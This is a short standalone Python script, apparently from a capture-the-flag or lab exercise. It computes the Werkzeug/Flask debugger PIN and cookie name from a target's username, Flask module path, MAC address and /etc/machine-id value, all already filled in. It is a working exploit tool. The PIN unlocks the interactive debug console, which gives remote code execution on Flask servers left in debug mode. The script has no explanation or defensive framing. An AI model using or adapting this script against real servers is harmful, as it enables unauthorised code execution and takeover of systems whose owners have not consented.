
import hashlib
from itertools import chain
probably_public_bits = [
	'hacker',# username
	'flask.app',# modname
	'Flask',
	'/usr/local/lib/python3.8/dist-packages/flask/app.py' 
]

private_bits = [
	'21810591418300',# str(uuid.getnode()),  /sys/class/net/ens33/address
	'e66186b814254f35bcf48e05d44a7457'# get_machine_id(), /etc/machine-id
]

h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
        if not bit:
            continue
        if isinstance(bit, str):
            bit = bit.encode("utf-8")
        h.update(bit)
h.update(b"cookiesalt")
cookie_name = "__wzd"+h.hexdigest()[:20]

    # If we need to generate a pin we salt it a bit more so that we don't
    # end up with the same value and generate out 9 digits
num=None
rv=None    
if num is None : 
    h.update(b"pinsalt")
    num = ("%09d" % int(h.hexdigest(), 16))[:9] 

if rv is None : 
    for group_size in 5 , 4 , 3 : 
        if len (num)% group_size == 0 : 
            rv = '-' .join (num [x: x + group_size] .rjust (group_size, '0' ) 
            for x in range ( 0 , len (num), group_size)) 
            break 
        else : 
            rv = num

print (rv)

